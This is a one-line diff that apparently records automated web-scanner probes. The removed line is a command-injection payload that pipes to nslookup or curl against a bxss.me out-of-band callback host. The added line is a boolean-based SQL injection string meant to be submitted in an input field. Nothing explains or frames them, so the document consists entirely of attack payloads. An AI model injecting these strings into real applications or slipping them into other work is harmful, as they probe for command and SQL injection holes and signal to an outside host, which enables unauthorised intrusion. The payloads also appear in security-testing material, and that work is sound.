@@ -1,1 +1,1 @@
-|(nslookup -q=cname hitilcvqoahrk9a8c4.bxss.me||curl hitilcvqoahrk9a8c4.bxss.me)
+-1" OR 2+917-917-1=0+0+0+1 -- 
